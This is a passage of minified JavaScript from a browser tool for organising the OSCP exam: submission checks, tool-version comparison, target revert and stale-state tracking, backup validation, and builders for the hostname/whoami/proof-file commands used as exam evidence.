function renderOperatorReverts(){const r=$('#operatorReverts');if(!r)return;r.innerHTML=`Current bank: <b>${revertState.bankUsed||0}/24</b> · reset ${revertState.resetUsed?'used':'available'}<br><span class="tiny">${targets.filter(t=>t.needsReestablish).length} target(s) need re-establishment · ${(revertState.ledger||[]).filter(x=>x.kind==='incident').length} incident(s)</span><br><button class="btn" id="opRevertOpen">Ledger →</button>`;$('#opRevertOpen').onclick=()=>switchView('revertView')}

/* Submission gate */
const SUB_CHECKS=[['reportOrderVerified','Target sections, IPs and report order verified against the control panel'],['pdfReviewed','Final PDF visually reviewed after export'],['createdOnKali','7z created and uploaded from Kali'],['archiveOnlyPdf','Archive contains only the final PDF'],['noPassword','7z archive is NOT password protected'],['archiveUnder200','Archive is ≤ 200 MB'],['uploaded','Archive uploaded within reporting window'],['md5Match','Upload-site MD5 equals local MD5'],['submitClicked','Final Submit File button clicked'],['confirmEmail','Acknowledgement/confirmation received']];
function saveSubmission(){safeStoreSet(STORE+'submissionState',JSON.stringify(submissionState));renderSubmission();renderClock()}
function expectedReportNames(){const o=($('#subOsid')?.value||submissionState.osid||'').trim().toUpperCase();return o?{pdf:`OSCP-${o}-Exam-Report.pdf`,archive:`OSCP-${o}-Exam-Report.7z`}:{pdf:'OSCP-OS-XXXXX-Exam-Report.pdf',archive:'OSCP-OS-XXXXX-Exam-Report.7z'}}
const OFFSEC_ARCHIVE_MAX_BYTES=200000000;function archiveWithinLimit(bytes){return Number.isFinite(+bytes)&&+bytes<=OFFSEC_ARCHIVE_MAX_BYTES}
function renderSubmission(){if(!$('#submissionChecklist'))return;$('#subOsid').value=submissionState.osid||'';const n=expectedReportNames();$('#expectedNames').textContent=`PDF: ${n.pdf}\n7z:  ${n.archive}`;const sc=$('#submissionCommands');if(sc)sc.textContent=`7z a ${n.archive} ${n.pdf}\n7z l ${n.archive}\nmd5sum ${n.archive}\n# Upload from Kali → compare the upload-site MD5 → click Submit File → confirm acknowledgement email`;$('#submissionChecklist').innerHTML=SUB_CHECKS.map(([k,l])=>`<label><input class="subCheck" data-sk="${k}" type="checkbox" ${submissionState[k]?'checked':''}> ${esc(l)}</label>`).join('');$$('.subCheck').forEach(x=>x.onchange=()=>{submissionState[x.dataset.sk]=x.checked;saveSubmission()});const critical=SUB_CHECKS.slice(0,-1).map(x=>x[0]).filter(k=>!submissionState[k]);$('#submissionSummary').innerHTML=critical.length?`<div class="auditIssue p0"><b>NOT SUBMISSION-COMPLETE</b><div class="tiny">Critical missing: ${critical.join(', ')}</div></div>`:'<div class="auditIssue ok"><b>Mechanical submission gate satisfied.</b></div>'}
$('#subOsid').oninput=()=>{submissionState.osid=$('#subOsid').value.trim().toUpperCase();saveSubmission()};
$('#subPdf').onchange=async e=>{const f=e.target.files[0];if(!f)return;const n=expectedReportNames(),sig=new TextDecoder().decode(new Uint8Array(await f.slice(0,5).arrayBuffer())),ok=f.name===n.pdf&&sig.startsWith('%PDF-');$('#subPdfResult').innerHTML=`<div class="fileCheck ${ok?'ok':'bad'}"><b>${esc(f.name)}</b><br>${f.name===n.pdf?'✅':'❌'} exact filename<br>${sig.startsWith('%PDF-')?'✅':'❌'} PDF signature<br>${bytes(f.size)}</div>`};
$('#subArchive').onchange=async e=>{const f=e.target.files[0];if(!f)return;const n=expectedReportNames(),h=new Uint8Array(await f.slice(0,6).arrayBuffer()),sig=[0x37,0x7a,0xbc,0xaf,0x27,0x1c].every((v,i)=>h[i]===v),size=archiveWithinLimit(f.size),name=f.name===n.archive;submissionState.archiveUnder200=size;safeStoreSet(STORE+'submissionState',JSON.stringify(submissionState));$('#subArchiveResult').innerHTML=`<div class="fileCheck ${sig&&size&&name?'ok':'bad'}"><b>${esc(f.name)}</b><br>${name?'✅':'❌'} exact filename<br>${sig?'✅':'❌'} 7z signature<br>${size?'✅':'❌'} ≤ 200 MB conservative limit (${bytes(f.size)})<br><span class="tiny">Run <code>7z l</code> locally and confirm the archive contains only the exact final PDF. Then compare the local MD5 with the upload-site MD5 before clicking Submit File.</span></div>`;renderSubmission()};
$('#subReset').onclick=()=>{if(confirm('Reset submission checklist?')){submissionState={osid:submissionState.osid||''};saveSubmission()}};$('#copySubmissionCommands').onclick=async()=>toast(await copyText($('#submissionCommands').textContent||'')?'Final submission commands copied':'Copy blocked by browser');

/* Compatibility */
function normVersion(s){const m=String(s||'').match(/(?:version[:\s]*|v)(\d+(?:\.\d+){1,3}(?:[-~._a-z0-9]+)?)/i)||String(s||'').match(/\b(\d+(?:\.\d+){1,3}(?:[-~._a-z0-9]+)?)\b/i);return m?m[1]:''}
function findPreflightTool(ref){if(!preflightData?.tools)return null;for(const k of ref.keys){const x=preflightData.tools.find(t=>String(t.tool).toLowerCase()===k.toLowerCase());if(x)return x}return null}
function compatibilityRows(){return V16_TOOL_REF.map(ref=>{const x=findPreflightTool(ref);if(!x)return{...ref,installed:'',status:'unknown',msg:'Not present in imported preflight.'};if(!x.present)return{...ref,installed:'missing',status:'bad',msg:'Command not found.'};const inst=normVersion(x.version||x.path),ok=inst&&String(inst).startsWith(String(ref.version));return{...ref,installed:inst||x.version||x.path,status:ok?'ok':'warn',msg:ok?'Matches embedded reference.':'Version differs or could not be parsed exactly — verify local help/syntax.'}})}
function renderCompat(){if(!$('#compatBody'))return;const rows=compatibilityRows();$('#compatBody').innerHTML=rows.map(r=>`<tr><td><b>${esc(r.name)}</b><div class="tiny">${esc(r.verified)}</div></td><td>${esc(r.version)}</td><td>${esc(r.installed||'no preflight')}</td><td class="${r.status==='ok'?'compatOk':r.status==='bad'?'compatBad':'compatWarn'}">${r.status.toUpperCase()}</td><td>${esc(r.msg)}<div class="tiny">${esc(r.note)}</div></td></tr>`).join('');$('#fallbackLadders').innerHTML=FALLBACK_LADDERS.map(([a,b,c])=>`<div class="fallbackCard"><b>${esc(a)}</b><div class="journalCmd">${esc(b)}</div><div class="tiny">${esc(c)}</div></div>`).join('');const mini=$('#freshCompatMini'),ok=rows.filter(r=>r.status==='ok').length,w=rows.filter(r=>r.status==='warn').length,b=rows.filter(r=>r.status==='bad').length;if(mini)mini.innerHTML=preflightData?`<b>${ok}</b> match · <b>${w}</b> drift · <b>${b}</b> missing`:'Import optional inventory JSON to compare installed versions.'}
$('#compatOpenSession').onclick=()=>switchView('sessionView');$('#freshOpenCompat').onclick=()=>switchView('compatView');

/* Evidence confusion + revert consistency */
function evidenceConfusionIssues(t){const mine=evidenceVault.filter(e=>e.targetId===t.id),others=evidenceVault.filter(e=>e.targetId!==t.id),names=new Set(others.map(e=>e.name.toLowerCase())),hashes=new Set(others.map(e=>e.sha256)),out=[];for(const e of mine){if(names.has(e.name.toLowerCase()))out.push(`Filename "${e.name}" is also used on another target.`);if(e.sha256&&hashes.has(e.sha256))out.push(`SHA-256 for "${e.name}" is assigned to another target too.`);const token=String(t.ip||t.host||'').toLowerCase();if(['proof','local-proof'].includes(e.kind)&&token&&!e.name.toLowerCase().includes(token))out.push(`Proof-class file "${e.name}" does not identify target ${token} in its local filename.`)}return[...new Set(out)]}
const v14AuditBase=consistencyAudit;
consistencyAudit=function(t){const a=v14AuditBase(t),u=unicodeProblems(reportCorpus(t));if(u.length)a.push({p:1,title:'Smart quotes / Unicode formatting remains in report material',why:u.join(', ')});for(const x of evidenceConfusionIssues(t))a.push({p:1,title:'Evidence-file confusion risk',why:x});if(t.needsReestablish)a.push({p:0,title:'Target was reverted and prior access is not marked re-established',why:t.reestablishNote||'Re-establish prior target-side state before relying on live-state assumptions.'});return a.sort((x,y)=>x.p-y.p)};

/* Session */
const v14SessionBase=sessionPayload;
sessionPayload=function(includeSecrets=false){const o=v14SessionBase(includeSecrets);o.app='OSCP-V14';o.version=14;o.examClock=examClock;o.revertState=revertState;o.submissionState=submissionState;return o};
const v14RestoreBase=restoreV9Payload;
restoreV9Payload=function(o){if(o?.examClock)examClock=o.examClock;if(o?.revertState)revertState=normalizeRevertState(o.revertState);if(o?.submissionState)submissionState=o.submissionState;v14RestoreBase(o);revertState=normalizeRevertState(revertState);targets=targets.map(upgradeV14Target);safeStoreSet(STORE+'examClock',JSON.stringify(examClock));safeStoreSet(STORE+'revertState',JSON.stringify(revertState));safeStoreSet(STORE+'submissionState',JSON.stringify(submissionState));renderAllV14()};

function renderAllV14(){renderAllV13();renderClock();renderReverts();renderSubmission();renderCompat();renderToolArsenal()}
const v14Switch=switchView;
switchView=function(id){v14Switch(id);if(id==='clockView')renderClock();if(id==='revertView')renderReverts();if(id==='submissionView')renderSubmission();if(id==='compatView')renderCompat();if(id==='toolArsenalView')renderToolArsenal()};

initToolArsenal();
renderAllV14();

renderAllV13();
renderAllV14();
if(!autosnapshots.length&&targets.length){
 setTimeout(()=>{if(!autosnapshots.length)snapshotNow('initial state')},1500);
}

renderSettings();renderPlaceholders();prepareCode();renderTargets();refreshTimerTargets();renderPlaybooks();renderDecoder();renderSearch('');renderEvidenceTemplate();updateTimer();
renderAllV7();


/* ===== V19 FAILURE-RESISTANT RELIABILITY LAYER ===== */
const V16_RULE_VERIFIED='2026-09-23';
const V16_CHAIN_KEYS=['observation','prerequisite','validation','primitive','identity','evidence'];
function v15Uuid(){return crypto.randomUUID?crypto.randomUUID():Date.now()+'-'+Math.random().toString(16).slice(2)}
function upgradeV16Target(t){
 t=upgradeV14Target(t);const ep=+t.revertEpoch||0;t.v15=plainRecord(t.v15)?t.v15:{};
 t.v15.lastRevalidatedEpoch=Number.isFinite(+t.v15.lastRevalidatedEpoch)?+t.v15.lastRevalidatedEpoch:ep;
 t.v15.liveStateStale=!!t.v15.liveStateStale;t.v15.staleSince=+t.v15.staleSince||0;t.v15.revalidatedAt=+t.v15.revalidatedAt||0;
 const chain=plainRecord(t.v15.chain)?t.v15.chain:{};t.v15.chain={observation:'',prerequisite:'',validation:'',primitive:'',identity:'',evidence:'',banked:false,...chain};for(const k of V16_CHAIN_KEYS)t.v15.chain[k]=String(t.v15.chain[k]??'');t.v15.chain.banked=!!t.v15.chain.banked;
 t.findings=(Array.isArray(t.findings)?t.findings:[]).filter(plainRecord).map(x=>({...x,id:x.id||v15Uuid(),epoch:Number.isFinite(+x.epoch)?+x.epoch:ep}));
 t.path=(Array.isArray(t.path)?t.path:[]).filter(plainRecord).map(x=>({...x,id:x.id||v15Uuid(),epoch:Number.isFinite(+x.epoch)?+x.epoch:ep}));
 t.timeline=(Array.isArray(t.timeline)?t.timeline:[]).filter(plainRecord).map(x=>({...x,id:x.id||v15Uuid(),epoch:Number.isFinite(+x.epoch)?+x.epoch:ep}));
 return t;
}
targets=targets.map(upgradeV16Target);
const v15NewTargetBase=newTarget;newTarget=function(){return upgradeV16Target(v15NewTargetBase())};
const v15SaveTargetsBase=saveTargets;saveTargets=function(){targets=targets.map(upgradeV16Target);v15SaveTargetsBase();renderV16ReliabilityMini()};
const v15LogEventBase=logEvent;logEvent=function(t,type,text,meta={}){v15LogEventBase(t,type,text,{...meta,v15Epoch:+t?.revertEpoch||0});if(t?.timeline?.length)t.timeline[t.timeline.length-1].epoch=+t.revertEpoch||0};

/* Stamp newly-created findings/path steps with the current revert epoch. */
const v15AddFindingBase=$('#addFinding').onclick;$('#addFinding').onclick=()=>{const t=activeTarget(),n=t?.findings?.length||0;v15AddFindingBase();if(t&&t.findings.length>n){Object.assign(t.findings[t.findings.length-1],{id:t.findings[t.findings.length-1].id||v15Uuid(),epoch:+t.revertEpoch||0});saveTargets();renderV16Chain()}};
const v15AddPathBase=$('#addPath').onclick;$('#addPath').onclick=()=>{const t=activeTarget(),n=t?.path?.length||0;v15AddPathBase();if(t&&t.path.length>n){Object.assign(t.path[t.path.length-1],{id:t.path[t.path.length-1].id||v15Uuid(),epoch:+t.revertEpoch||0});saveTargets();renderV16Chain()}};

function v15MarkRevertStale(t,oldEpoch,newEpoch){if(!t)return;t=upgradeV16Target(t);t.v15.liveStateStale=true;t.v15.staleSince=Date.now();t.v15.lastRevalidatedEpoch=Math.min(+t.v15.lastRevalidatedEpoch||oldEpoch,oldEpoch);logEvent(t,'stale',`Marked live state stale after revert epoch ${oldEpoch} → ${newEpoch}`);}
const v15RevertBase=$('#logRevert').onclick;$('#logRevert').onclick=()=>{const t=targets.find(x=>x.id===$('#revertTarget').value),old=+t?.revertEpoch||0;v15RevertBase();if(t&&(+t.revertEpoch||0)>old){v15MarkRevertStale(t,old,+t.revertEpoch);saveTargets();renderV16Reliability();renderV16Chain()}};
function v15Revalidate(t){if(!t)return;t.v15=t.v15||{};t.v15.lastRevalidatedEpoch=+t.revertEpoch||0;t.v15.liveStateStale=false;t.v15.revalidatedAt=Date.now();t.needsReestablish=false;logEvent(t,'revalidate',`Live state revalidated for revert epoch ${t.revertEpoch||0}`);saveTargets();renderReverts();renderV16Reliability();}

function v15StaleItems(t){if(!t)return[];const ep=+t.revertEpoch||0,out=[];const stale=t.v15?.liveStateStale||(+t.v15?.lastRevalidatedEpoch||0)<ep;
 if(!stale)return out;
 if(t.status?.foothold)out.push('foothold shell/session');if(t.status?.privesc)out.push('privileged shell/session');if(hasSignal(t,'internal'))out.push('pivot/tunnel/route state');
 if((t.findings||[]).some(f=>+f.epoch<ep&&['prereq','high','exploited'].includes(f.confidence)))out.push('pre-revert validated/exploited findings');
 if((t.path||[]).some(p=>+p.epoch<ep&&['foothold','privesc','lateral'].includes(p.type)&&p.result!=='dead-end'))out.push('pre-revert live attack-path state');
 out.push('uploaded tools / target-side changes / temporary sessions');return [...new Set(out)];
}

function v15StateIssuesFor(state){
 const ts=state.targets||[],cs=state.credentials||[],ev=state.evidenceVault||[],active=state.activeTargetId||'',issues=[];const add=(p,title,why,targetId='')=>issues.push({p,title,why,targetId});
 const ids=ts.map(t=>t.id).filter(Boolean),seen=new Set(),dups=new Set();for(const id of ids){if(seen.has(id))dups.add(id);seen.add(id)}if(dups.size)add(0,'Duplicate target IDs',`Duplicate IDs: ${[...dups].join(', ')}`);
 if(ts.length&&(!active||!ids.includes(active)))add(0,'Active target points to missing target',`activeTargetId=${active||'(empty)'}`);
 const idset=new Set(ids);for(const c of cs){if(c.sourceTarget&&!idset.has(c.sourceTarget))add(1,'Orphan credential source',`${c.user||'credential'} references ${c.sourceTarget}`)}
 for(const e of ev){if(e.targetId&&!idset.has(e.targetId))add(1,'Orphan evidence entry',`${e.name||'evidence'} references ${e.targetId}`)}
 const totalPossible=ts.reduce((n,t)=>n+(+t.pointsPossible||0),0),totalAwarded=ts.reduce((n,t)=>n+(+t.pointsAwarded||0),0);if(totalPossible>100)add(0,'Configured possible points exceed exam total',`${totalPossible}/100 — copy objective values from the Exam Control Panel`);if(totalAwarded>100)add(0,'Awarded estimate exceeds exam total',`${totalAwarded}/100 — correct local scoring before trusting it`);
 for(const t0 of ts){const t=upgradeV16Target({...t0});if(!t.id)add(0,'Target missing ID',t.ip||t.host||'unnamed');if(!t.ip)add(2,'Target has no IP',t.host||t.id,t.id);
  if((+t.pointsPossible||0)>0&&(+t.pointsAwarded||0)>(+t.pointsPossible||0))add(0,'Awarded points exceed possible points',`${targetLabel(t)}: ${t.pointsAwarded}/${t.pointsPossible}`,t.id);
  if((+t.pointsAwarded||0)<0)add(1,'Negative awarded points',targetLabel(t),t.id);
  if(t.stage==='complete'&&closureItems(t).some(x=>!x.ok))add(0,'Complete target has missing closure',closureItems(t).filter(x=>!x.ok).map(x=>x.l).join('; '),t.id);
  if(v15StaleItems(t).length)add(0,'Live state is stale after revert',`${targetLabel(t)}: ${v15StaleItems(t).join(', ')}`,t.id);
  const pids=(t.path||[]).map(x=>x.id).filter(Boolean);if(new Set(pids).size!==pids.length)add(1,'Duplicate attack-path entry IDs',targetLabel(t),t.id);
  const fids=(t.findings||[]).map(x=>x.id).filter(Boolean);if(new Set(fids).size!==fids.length)add(1,'Duplicate finding IDs',targetLabel(t),t.id);
 }
 return issues.sort((a,b)=>a.p-b.p);
}
function v15StateIssues(){return v15StateIssuesFor({targets,credentials,evidenceVault,activeTargetId})}
function v15SafeRepairPreview(){const r=[];if(targets.length&&(!activeTargetId||!targets.some(t=>t.id===activeTargetId)))r.push('Set active target to the first valid target.');for(const t of targets){if(!t.v15)r.push(`Initialize reliability state for ${targetLabel(t)}.`);if((t.path||[]).some(x=>!x.id||!Number.isFinite(+x.epoch)))r.push(`Stamp missing path IDs/epochs on ${targetLabel(t)}.`);if((t.findings||[]).some(x=>!x.id||!Number.isFinite(+x.epoch)))r.push(`Stamp missing finding IDs/epochs on ${targetLabel(t)}.`)}return r}
function v15ApplySafeRepair(){targets=targets.map(upgradeV16Target);if(targets.length&&(!activeTargetId||!targets.some(t=>t.id===activeTargetId)))activeTargetId=targets[0].id;saveTargets();saveOps();renderV16Reliability();toast('Safe repair applied — no records deleted')}

function v15ScoreActions(t){if(!t)return[];const q=attentionQueue(t),rows=[];if(v15StaleItems(t).length)rows.push({title:'Revalidate live state after revert',tag:'[STATE:STALE]',why:v15StaleItems(t).join(', '),score:99,parts:['+99 stale live-state blocker']});for(const x of q){let score={0:100,1:84,2:66,3:48,4:30}[x.p]??40,parts=[`base ${score} from priority P${x.p}`];if(x.kind==='evidence'){score+=15;parts.push('+15 evidence/points closure')}if(x.kind==='credential'){score+=10;parts.push('+10 credential coverage')}if(x.kind==='finding'){score+=7;parts.push('+7 high-signal validation')}if(x.kind==='coverage'){score+=3;parts.push('+3 explicit enumeration gap')}if(t.needsReestablish&&x.kind!=='evidence'){score-=12;parts.push('-12 target live state not re-established')}score=Math.max(0,Math.min(100,score));rows.push({...x,score,parts})}return rows.sort((a,b)=>b.score-a.score).slice(0,8)}
function v15Debt(t){if(!t)return{credential:0,coverage:0,evidence:0,validation:0,output:0};const credential=credentialDebts().filter(d=>d.t.id===t.id).length,coverage=uncoveredServices(t).reduce((n,x)=>n+x.missing.length,0),evidence=closureItems(t).filter(x=>!x.ok).length,validation=(t.findings||[]).filter(f=>['prereq','high'].includes(f.confidence)).length,output=analyzerDetections.filter(x=>x.selected&&!x.skipApply).length;return{credential,coverage,evidence,validation,output}}

function v15Chain(t){return upgradeV16Target(t).v15.chain}
function v15ChainChecks(t){if(!t)return[];const c=v15Chain(t),labels={observation:'Concrete observation recorded',prerequisite:'Exploit prerequisite stated',validation:'Prerequisite validation recorded',primitive:'Controlled primitive recorded',identity:'Resulting identity/access recorded',evidence:'Evidence/closure recorded'};const out=V16_CHAIN_KEYS.map(k=>({k,label:labels[k],ok:!!String(c[k]||'').trim()}));out.push({k:'banked',label:'Points/evidence banked',ok:!!c.banked});return out}
function v15SeedChainFromState(t){if(!t)return;const c=v15Chain(t),high=(t.findings||[]).filter(f=>['prereq','high','exploited'].includes(f.confidence)).map(f=>f.title).slice(0,3),validated=(t.path||[]).filter(p=>['validated','success'].includes(p.result)).map(p=>p.label).slice(-3),success=(t.path||[]).filter(p=>p.result==='success').map(p=>`${p.type}: ${p.label}`).slice(-3);c.observation=c.observation||high.join(' · ')||`Signals: ${(t.signals||[]).join(', ')}`;c.prerequisite=c.prerequisite||high.join(' · ');c.validation=c.validation||validated.join(' · ');c.primitive=c.primitive||success.join(' · ');c.identity=c.identity||(t.status?.privesc?'root/SYSTEM obtained — replace with exact identity':t.status?.foothold?'foothold obtained — replace with exact identity':'');const ci=closureItems(t);c.evidence=c.evidence||ci.filter(x=>x.ok).map(x=>x.l).join(' · ');c.banked=c.banked||((t.status?.local||t.status?.proof)&&ci.length>0&&ci.every(x=>x.ok));saveTargets()}
function v15ReproItems(t){if(!t)return[];const corpus=reportCorpus(t).toLowerCase(),idTokens=[t.ip,t.host].filter(Boolean).map(x=>String(x).toLowerCase());const items=[];const add=(l,ok)=>items.push({l,ok:!!ok});add('Target identity/IP appears in reproducibility material',idTokens.some(x=>corpus.includes(x)));add('Foothold/vector description recorded',!t.status?.foothold||String(t.report?.foothold||'').trim().length>=15);add('Exact commands/reproduction notes recorded',String(t.report?.commands||'').trim().length>=20);add('Privilege-escalation reasoning recorded',!t.status?.privesc||String(t.report?.privesc||'').trim().length>=15);add('Command Journal has supporting history',(t.journal||[]).length>0);for(const x of closureItems(t))add(x.l,x.ok);add('No P0 consistency blocker',!consistencyAudit(t).some(x=>x.p===0));return items}

function v15BackupValidate(o){const issues=[];if(!o||typeof o!=='object'||Array.isArray(o))return{ok:false,issues:['Not a JSON object']};if(!Array.isArray(o.targets))issues.push('targets array missing');if(Array.isArray(o.targets)){if(o.targets.some(x=>!x||typeof x!=='object'||!String(x.id||'').trim()))issues.push('target with missing ID');if(o.targets.some(x=>x&&x.id&&!validRecordId(x.id)))issues.push('target with invalid ID');if(new Set(o.targets.map(x=>x?.id)).size!==o.targets.length)issues.push('duplicate target IDs')}if(o.credentials!==undefined&&!Array.isArray(o.credentials))issues.push('credentials must be an array');if(Array.isArray(o.credentials)){if(o.credentials.some(x=>!x||typeof x!=='object'||!String(x.id||'').trim()))issues.push('credential with missing ID');if(o.credentials.some(x=>x&&x.id&&!validRecordId(x.id)))issues.push('credential with invalid ID');if(new Set(o.credentials.map(x=>x?.id)).size!==o.credentials.length)issues.push('duplicate credential IDs');if(o.credentials.some(c=>c?.checks!==undefined&&(typeof c.checks!=='object'||Array.isArray(c.checks)||c.checks===null)))issues.push('credential checks must be an object');if(o.credentials.some(c=>c?.checks&&Object.values(c.checks).some(v=>!V7_MATRIX_STATES.includes(v))))issues.push('credential checks contain invalid state')}if(o.evidenceVault!==undefined&&!Array.isArray(o.evidenceVault))issues.push('evidenceVault must be an array');if(Array.isArray(o.evidenceVault)&&o.evidenceVault.some(x=>x?.id!==undefined&&!validRecordId(x.id)))issues.push('evidence with invalid ID');if(o.version!==undefined&&(!Number.isFinite(+o.version)||+o.version<1))issues.push('invalid backup version');if(o.version&&+o.version>19)issues.push(`backup schema ${o.version} is newer than supported schema 19`);if(Array.isArray(o.targets)&&o.activeTargetId&&!o.targets.some(t=>t.id===o.activeTargetId))issues.push('activeTargetId is orphaned');return{ok:issues.length===0,issues,stats:{app:o.app||'unknown',version:o.version||'unknown',targets:o.targets?.length||0,credentials:o.credentials?.length||0,evidence:o.evidenceVault?.length||0}}}
const v20BackupValidateBase=v15BackupValidate;
v15BackupValidate=function(o){
 const r=v20BackupValidateBase(o),issues=[...r.issues],isRecord=v=>v&&typeof v==='object'&&!Array.isArray(v),needRecord=(k)=>{if(o?.[k]!==undefined&&!isRecord(o[k]))issues.push(`${k} must be an object`)};
 ['settings','boardConfig','guardConfig','expertPrefs','freshnessState','preExamState','examClock','revertState','submissionState','windowsStrategyState','adFastPathState','adEdgePlannerState','credentialRouteState','rubeusRouteState','examRuleLockState','accessLadderState'].forEach(needRecord);
 if(o?.favorites!==undefined&&!Array.isArray(o.favorites))issues.push('favorites must be an array');
 if(isRecord(o?.revertState)&&o.revertState.ledger!==undefined&&!Array.isArray(o.revertState.ledger))issues.push('revertState.ledger must be an array');
 if(isRecord(o?.guardConfig)&&o.guardConfig.entries!==undefined&&!Array.isArray(o.guardConfig.entries))issues.push('guardConfig.entries must be an array');
 if(Array.isArray(o?.evidenceVault)){const ids=o.evidenceVault.map(x=>x?.id).filter(Boolean);if(new Set(ids).size!==ids.length)issues.push('duplicate evidence IDs')}
 if(Array.isArray(o?.targets)&&o.targets.some(t=>t?.ports!==undefined&&!Array.isArray(t.ports)))issues.push('target ports must be arrays');
 if(Array.isArray(o?.targets)&&o.targets.some(t=>t?.status!==undefined&&!isRecord(t.status)))issues.push('target status must be an object');
 if(Array.isArray(o?.targets)&&o.targets.some(t=>t?.evidence!==undefined&&!isRecord(t.evidence)))issues.push('target evidence must be an object');
 if(Array.isArray(o?.targets)&&o.targets.some(t=>t?.report!==undefined&&!isRecord(t.report)))issues.push('target report must be an object');
 return{...r,ok:issues.length===0,issues:[...new Set(issues)]};
};
function assertRestorableBackup(o){const r=v15BackupValidate(o);if(!r.ok)throw new Error('Backup validation failed: '+r.issues.join('; '));return o}

const CAPTURE_DEFAULTS={
 linux:{proof:'/root/proof.txt',local:'/home/USER/local.txt'},
 cmd:{proof:'C:\\Users\\Administrator\\Desktop\\proof.txt',local:'C:\\Users\\USER\\Desktop\\local.txt'},
 powershell:{proof:'C:\\Users\\Administrator\\Desktop\\proof.txt',local:'C:\\Users\\USER\\Desktop\\local.txt'}
};
function buildCaptureCommand(platform,path){
 const clean=String(path||'').replace(/[\r\n]/g,' ').trim();
 if(platform==='cmd')return`hostname & whoami & ipconfig | findstr /I "IPv4" & cd & type "${clean.replace(/"/g,'""')}"`;
 if(platform==='powershell')return`hostname; whoami; ipconfig | Select-String 'IPv4'; Get-Location; type '${clean.replace(/'/g,"''")}'`;
 return`hostname; id; ip addr | grep 'inet '; pwd; cat -- '${clean.replace(/'/g,"'\"'\"'")}'`;
}
function captureFileName(target,kind){
 const raw=[target?.host,target?.ip].map(x=>String(x||'').trim()).filter(Boolean).join('-').toLowerCase()||'target';
 const stem=raw.replace(/[^a-z0-9._-]+/g,'-').replace(/^[._-]+|[._-]+$/g,'').slice(0,80)||'target';
 return`${stem}-${kind==='local'?'local':'proof'}-original-path.png`;
}
function capturePathIssue(platform,path){
 const value=String(path||'').trim();if(!value)return'Enter the flag’s original absolute path.';
 if(/(^|[\\/])USER([\\/]|$)|[<>]/i.test(value))return'Replace USER or angle-bracket placeholders with the exact path.';
 if(platform==='linux'&&!value.startsWith('/'))return'Linux proof paths must be absolute (start with /).';
 if(platform!=='linux'&&!/^([a-z]:\\|\\\\)/i.test(value))return'Windows proof paths must be absolute (drive or UNC path).';
 return'';
}
function renderCaptureCommand(resetPath=false){
 const platform=$('#capturePlatform'),kind=$('#captureKind'),path=$('#capturePath'),out=$('#captureCommand'),file=$('#captureFilename'),warning=$('#capturePathWarning'),copy=$('#copyCaptureCommand');if(!platform||!kind||!path||!out)return;
 if(resetPath||!path.value)path.value=CAPTURE_DEFAULTS[platform.value]?.[kind.value]||'';
 out.textContent=buildCaptureCommand(platform.value,path.value);
 const issue=capturePathIssue(platform.value,path.value);path.classList.toggle('inputWarn',!!issue);path.setAttribute('aria-invalid',issue?'true':'false');if(warning)warning.textContent=issue?`⚠ ${issue}`:'✓ Concrete absolute path ready—confirm it is the flag’s original location.';if(copy)copy.disabled=!!issue;
 if(file)file.textContent=captureFileName(activeTarget(),kind.value);
}
function simpleRiskSummary(){
 const atRiskTargets=targets.filter(t=>{const items=closureItems(t);return items.length>0&&items.some(x=>!x.ok)}).sort((a,b)=>closureItems(b).filter(x=>!x.ok).length-closureItems(a).filter(x=>!x.ok).length);
 const staleTargets=targets.filter(t=>v15StaleItems(t).length>0);
 return{total:targets.length,points:targets.reduce((n,t)=>n+(+t.pointsAwarded||0),0),goal:OSCP_PASS_TARGET,atRiskTargets,staleTargets,credentialDebt:credentialDebts().length,lastSnapshot:autosnapshots[0]?.at||0};
}
function renderSimpleRiskStrip(){
 const root=$('#simpleRiskStrip'),open=$('#simpleRiskOpen');if(!root)return;const r=simpleRiskSummary(),snap=r.lastSnapshot?new Date(r.lastSnapshot).toLocaleString():'none yet';
 root.innerHTML=`<div class="riskMetric ${r.points>=r.goal?'good':r.points?'warn':''}"><b>${r.points} / ${r.goal}</b>recorded point estimate</div><div class="riskMetric ${r.total?'':'warn'}"><b>${r.total}</b>target${r.total===1?'':'s'} tracked</div><div class="riskMetric ${r.atRiskTargets.length?'bad':'good'}"><b>${r.atRiskTargets.length}</b>with access but incomplete closure</div><div class="riskMetric ${r.staleTargets.length?'warn':'good'}"><b>${r.staleTargets.length}</b>stale after revert</div><div class="riskMetric ${r.credentialDebt?'warn':'good'}"><b>${r.credentialDebt}</b>untested credential/service pair${r.credentialDebt===1?'':'s'}</div><div class="riskMetric ${r.lastSnapshot?'good':'warn'}"><b>${r.lastSnapshot?'✓':'○'}</b>secret-field-free recovery point<div class="tiny">${esc(snap)}</div></div>`;
 if(open){const next=r.atRiskTargets[0]||r.staleTargets[0]||targets[0];open.disabled=!next;open.textContent=r.atRiskTargets.length?'Open unbanked target →':r.staleTargets.length?'Open stale target →':r.total?'Open current target →':'Add target →'}
}
function openHighestRisk(){
 const r=simpleRiskSummary(),t=r.atRiskTargets[0]||r.staleTargets[0]||activeTarget()||targets[0];if(!t){switchView('workspaceView');return}setActiveTarget(t.id);switchView(r.atRiskTargets.includes(t)?'reportsView':'workspaceView');}
function renderSimplePointProtection(){
 const box=$('#simplePointProtectionStatus');if(!box)return;const t=activeTarget();
 if(!t){box.className='pointStatus';box.innerHTML='<b>No active target.</b><div class="tiny">Add the current exam target, then this gate will show exactly what remains before its points are safe.</div><button class="btn" id="simplePointOpenTarget">Add / select target →</button>';const b=$('#simplePointOpenTarget');if(b)b.onclick=()=>switchView('workspaceView');return}
 const items=closureItems(t),missing=items.filter(x=>!x.ok),done=items.length-missing.length,hasAccess=!!(t.status?.foothold||t.status?.local||t.status?.privesc||t.status?.proof),next=attentionQueue(t)[0];
 box.className=`pointStatus ${hasAccess?(missing.length?'due':'safe'):''}`;
 box.innerHTML=`<div class="row" style="justify-content:space-between;align-items:flex-start"><div><b>${esc(targetLabel(t))}</b> · ${esc(String(t.stage||phaseFor(t)))}</div><b>${done}/${items.length} closure checks</b></div><div class="pointRail">${items.length?items.map(x=>`<span class="${x.ok?'ok':'miss'}">${x.ok?'✓':'○'} ${esc(x.l)}</span>`).join(''):'<span>Closure activates as soon as foothold/local access is recorded.</span>'}</div><div class="tiny"><b>Do now:</b> ${esc(missing.length?'Complete '+missing[0].l:(next?.title||'Write the next action; take a 5–10 minute break if fatigue is rising.'))}</div>`;
}
function renderV16ReliabilityMini(){renderSimplePointProtection();renderSimpleRiskStrip()}
function renderV16Reliability(){
